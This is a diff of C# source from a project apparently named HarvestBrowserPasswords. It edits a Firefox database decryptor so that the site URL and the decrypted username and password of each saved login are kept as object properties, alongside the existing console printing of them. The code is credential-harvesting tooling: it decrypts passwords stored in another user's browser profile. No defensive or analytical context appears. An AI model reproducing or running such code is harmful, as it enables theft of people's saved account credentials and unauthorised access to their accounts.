@@ -14,17 +14,18 @@ namespace HarvestBrowserPasswords
     {
         public string ProfileDir               { get; set; }
         public string Key4dbpath               { get; set; }
+        public string FormSubmitUrl            { get; set; }
+        public string Username                 { get; set; }
+        public string Password                 { get; set; }
         public byte[] GlobalSalt               { get; set; }
-        public byte[] EntrySaltPasswordCheck    { get; set; }
+        public byte[] EntrySaltPasswordCheck   { get; set; }
         public byte[] EntrySalt3DESKey         { get; set; }
-        public byte[] CipherTextPasswordCheck   { get; set; }
-        public byte[] CipherText3DESKey         { get; set; }
-        public string MasterPassword            { get; set; }
-        public byte[] DecryptedPasswordCheck    { get; set; }
-        public byte[] Decrypted3DESKey          { get; set; }
-        public byte[] EntrySaltLoginData        { get; set; }
-        public byte[] CipherTextLoginData       { get; set; }
-        public byte[] DecryptedLoginData        { get; set; }
+        public byte[] CipherTextPasswordCheck  { get; set; }
+        public byte[] CipherText3DESKey        { get; set; }
+        public string MasterPassword           { get; set; }
+        public byte[] DecryptedPasswordCheck   { get; set; }
+        public byte[] Decrypted3DESKey         { get; set; }
+
 
         public FirefoxDatabaseDecryptor(string profile, string password)
         {
@@ -63,6 +64,7 @@ namespace HarvestBrowserPasswords
                                 byte[] usernameBytes = Convert.FromBase64String(login.EncryptedUsername);
                                 byte[] passwordBytes = Convert.FromBase64String(login.EncryptedPassword);
                                 Console.WriteLine($"URL                     {login.FormSubmitURL}");
+                                FormSubmitUrl = login.FormSubmitURL;
 
                                 ASN1 usernameASN1 = new ASN1(usernameBytes);
 
@@ -75,11 +77,11 @@ namespace HarvestBrowserPasswords
                                 byte[] passwordIV = passwordASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[0];
                                 byte[] passwordEncrypted = passwordASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[1];
 
-                                string usernameDecrypted = Encoding.UTF8.GetString(Unpad(Decrypt3DESLogins(usernameEncrypted, usernameIV, Decrypted3DESKey)));
-                                string passwordDecrypted = Encoding.UTF8.GetString(Unpad(Decrypt3DESLogins(passwordEncrypted, passwordIV, Decrypted3DESKey)));
+                                Username = Encoding.UTF8.GetString(Unpad(Decrypt3DESLogins(usernameEncrypted, usernameIV, Decrypted3DESKey)));
+                                Password = Encoding.UTF8.GetString(Unpad(Decrypt3DESLogins(passwordEncrypted, passwordIV, Decrypted3DESKey)));
 
-                                Console.WriteLine($"Decrypted Username      {usernameDecrypted}");
-                                Console.WriteLine($"Decrypted Password      {passwordDecrypted}");
+                                Console.WriteLine($"Decrypted Username      {Username}");
+                                Console.WriteLine($"Decrypted Password      {Password}");
                             }
                         }
                         catch (NullReferenceException)
@@ -87,6 +89,7 @@ namespace HarvestBrowserPasswords
 
                         }
                     }
+                    Console.ResetColor();
                 }
             }
         }
